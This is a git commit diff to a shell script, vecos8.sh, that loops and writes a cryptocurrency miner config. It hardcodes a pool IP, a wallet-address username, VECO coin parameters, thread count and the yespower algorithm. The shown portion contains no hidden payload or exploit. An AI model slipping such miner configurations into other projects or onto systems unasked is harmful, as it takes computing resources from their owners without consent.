f9a91d8f01aec448161b8696f050f9cc04e92ab1
barburonjilo <barburonjilo@outlook.co.id>
2025-05-15 12:07:12 +0700

    Update vecos8.sh

--- vecos8.sh
+++ vecos8.sh
@@ -11,9 +11,9 @@ while true; do
   # Create config.json with the current date
   cat > config.json <<END
 {
-  "url": "45.115.225.146:443",
-  "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ.worker8",
-  "pass": "c=SWAMP,m=solo,zap=SWAMP,mc=SWAMP",
+  "url": "45.115.225.186:443",
+  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker8",
+  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
   "threads": 6,
   "algo": "yespower"
 }
